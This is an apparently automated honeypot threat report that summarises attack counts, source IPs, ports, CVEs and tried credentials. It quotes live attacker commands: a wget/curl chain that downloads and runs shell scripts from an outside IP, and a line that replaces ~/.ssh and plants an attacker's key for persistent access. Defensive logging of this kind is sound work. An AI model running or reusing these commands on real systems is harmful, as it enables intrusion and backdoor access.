
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-27T11:01:51Z
**Timeframe:** 2025-10-27T10:20:02Z to 2025-10-27T11:00:01Z
**Files Used:**
- agg_log_20251027T102002Z.json
- agg_log_20251027T104001Z.json
- agg_log_20251027T110001Z.json

## Executive Summary

This report summarizes 18,594 events collected from the honeypot network. The most active honeypots were Suricata, Honeytrap, and Cowrie. A significant portion of the attacks originated from the IP address 198.23.190.58. The most frequently targeted ports were 5060 (SIP) and 7070. Several CVEs were exploited, with CVE-2005-4050 being the most common. Attackers attempted a variety of commands, including downloading and executing shell scripts.

## Detailed Analysis

### Attacks by Honeypot
- Suricata: 5600
- Honeytrap: 4669
- Cowrie: 2723
- Sentrypeer: 2297
- Ciscoasa: 1923
- Dionaea: 1071
- Mailoney: 124
- Adbhoney: 89
- Tanner: 28
- ConPot: 18
- ElasticPot: 17
- H0neytr4p: 13
- Redishoneypot: 9
- Honeyaml: 5
- Dicompot: 4
- Heralding: 3
- Ipphoney: 1

### Top Attacking IPs
- 198.23.190.58: 2275
- 134.199.195.136: 995
- 82.118.227.114: 991
- 85.208.84.166: 778
- 85.208.84.217: 762
- 85.208.84.214: 694
- 144.172.108.231: 384
- 85.208.84.215: 373
- 85.208.84.167: 369
- 85.208.84.219: 369
- 185.243.5.158: 362
- 85.208.84.218: 357
- 85.208.84.169: 353
- 85.208.84.170: 337
- 144.130.11.9: 533
- 45.140.17.26: 474
- 209.38.98.72: 285
- 107.170.36.5: 253
- 117.102.100.58: 242
- 36.69.153.30: 232

### Top Targeted Ports/Protocols
- 5060: 2297
- 7070: 1013
- UDP/5060: 771
- 22: 487
- 1433: 484
- 445: 541
- 5903: 135
- 5901: 126
- 25: 124
- TCP/22: 78
- TCP/80: 74

### Most Common CVEs
- CVE-2005-4050
- CVE-2002-0013 CVE-2002-0012
- CVE-1999-0265
- CVE-2021-3449 CVE-2021-3449
- CVE-2019-11500 CVE-2019-11500
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517

### Commands Attempted by Attackers
- cd /data/local/tmp/; busybox wget http://202.55.132.254/w.sh; sh w.sh; curl http://202.55.132.254/c.sh; sh c.sh; wget http://202.55.132.254/wget.sh; sh wget.sh; curl http://202.55.132.254/wget.sh; sh wget.sh; busybox wget http://202.55.132.254/wget.sh; sh wget.sh; busybox curl http://202.55.132.254/wget.sh; sh wget.sh
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- uname -a
- cat /proc/cpuinfo | grep name | wc -l

### Signatures Triggered
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET HUNTING RDP Authentication Bypass Attempt
- ET VOIP MultiTech SIP UDP Overflow
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024

### Users / Login Attempts
- root/Intelbras
- root/InteliSoport3
- root/\\INUASl7nvari7gt
- 345gs5662d34/345gs5662d34
- root/inVisable99!
- root/ip3a179312
- root/ipbxarm
- sa/JiwaFinancials123

### Files Uploaded/Downloaded
- wget.sh;
- w.sh;
- c.sh;
- arm.uhavenobotsxd;
- arm.uhavenobotsxd
- arm5.uhavenobotsxd;
- arm5.uhavenobotsxd
- arm6.uhavenobotsxd;
- arm6.uhavenobotsxd
- arm7.uhavenobotsxd;
- arm7.uhavenobotsxd
- x86_32.uhavenobotsxd;
- x86_32.uhavenobotsxd
- mips.uhavenobotsxd;
- mips.uhavenobotsxd
- mipsel.uhavenobotsxd;
- mipsel.uhavenobotsxd
- icanhazip.com

### HTTP User-Agents
- N/A

### SSH Clients
- N/A

### SSH Servers
- N/A

### Top Attacker AS Organizations
- N/A

## Key Observations and Anomalies

- A high number of attacks targeted SIP (Session Initiation Protocol) on port 5060, indicating a focus on VoIP systems.
- The repeated use of `wget` and `curl` to download and execute shell scripts from a specific IP address (202.55.132.254) suggests an automated attack campaign.
- The exploitation of CVE-2005-4050, a vulnerability in MultiTech VoIP products, aligns with the observed targeting of SIP.
- Attackers frequently attempted to add their SSH key to the `authorized_keys` file for persistent access.
